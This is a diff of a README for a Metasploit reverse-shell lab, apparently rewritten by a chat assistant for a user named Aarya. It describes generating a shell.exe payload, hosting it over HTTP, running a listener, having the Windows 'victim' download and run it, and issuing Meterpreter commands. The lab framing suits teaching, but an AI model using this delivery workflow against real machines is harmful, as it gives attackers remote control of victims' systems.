@@ -1,80 +1,82 @@
+Absolutely, Aarya! Here's the **exact `README.md` content** you can copy and paste directly into your GitHub repo:
+
+---
+
+### ✅ 📄 `README.md` (copy this)
+
+````markdown
 # Metasploit Reverse Shell Lab
 
-This project demonstrates how to create a **reverse TCP shell** using the Metasploit Framework in a controlled lab environment (Kali Linux as attacker, Windows 10 as victim).
+This is a simple and educational reverse shell lab setup using **Metasploit**, built for safe testing in virtual machines only.
 
-The automation is handled by a single script: `scripts/run_lab.sh`.
-
----
-
-## 🛠️ Requirements
-
-- Kali Linux (with Metasploit installed)
-- Windows 10 VM (victim)
-- VirtualBox or VMware
-- Both machines on same LAN / Host-only network
+The automation is handled by a Bash script: `scripts/run_lab.sh`.
 
 ---
 
-## 📂 How to Use
+## 🧰 Requirements
 
-### 1. Clone this repository
+- Kali Linux (with Metasploit Framework installed)
+- Windows 10 Virtual Machine (victim)
+- Both VMs connected to the same local network (e.g., NAT, Host-only)
+
+---
+
+## 🛠 How to Use
+
+### 🔹 1. Clone the Repo
 
 ```bash
 git clone https://github.com/<your-username>/metasploit-reverse-shell-lab.git
 cd metasploit-reverse-shell-lab/scripts
-2. Make script executable
-bash
-Copy
-Edit
+````
+
+### 🔹 2. Make the Script Executable
+
+```bash
 chmod +x run_lab.sh
-3. Run the script
-bash
-Copy
-Edit
+```
+
+### 🔹 3. Run the Script
+
+```bash
 ./run_lab.sh <your-kali-ip> 4444
-Example:
-./run_lab.sh 192.168.1.50 4444
+```
 
-This will:
+It will:
 
-Generate a reverse shell payload (shell.exe)
-
-Host it over HTTP at http://<ip>:8000/shell.exe
-
-Start a Metasploit handler waiting for the connection
-
-🪟 On the Windows Victim VM
-Open a browser
-
-Visit: http://<kali-ip>:8000/shell.exe
-
-Download and run the file
-
-🐚 If it works…
-You'll see a Meterpreter session open in your Kali terminal:
-
-bash
-Copy
-Edit
-meterpreter > sysinfo
-meterpreter > shell
-⚠️ DISCLAIMER
-This lab is for educational use only in a virtual environment. Do not use this on real systems or networks you don’t have permission to test.
-
-📝 Credits
-Made by Aarya as part of a cybersecurity learning project (ShadowFox Internship Lab – June 2025).
-
-yaml
-Copy
-Edit
+* Generate a payload: `shell.exe`
+* Host it over HTTP on port `8000`
+* Start a Metasploit listener waiting for the connection
 
 ---
 
-## ✅ 2. Optional `.gitignore` (optional but safe)
+## 💻 On the Windows VM (Victim)
 
-Create a `.gitignore` file with this content:
+1. Open a browser
+2. Go to: `http://<kali-ip>:8000/shell.exe`
+3. Download and run `shell.exe`
 
-```bash
-payloads/
-*.exe
-*.log
+---
+
+## ✅ If Successful
+
+You’ll see a Meterpreter session in your Kali terminal:
+
+```
+[*] Meterpreter session 1 opened
+meterpreter > sysinfo
+meterpreter > screenshot
+```
+
+You now have full post-exploitation access inside your virtual lab.
+
+---
+
+
+## ⚠️ Legal & Ethical Notice
+
+This project is for **educational use only** inside a virtual environment you fully control.
+
+Do **NOT** use these techniques on real networks or systems you do not have permission to test.
+
+---
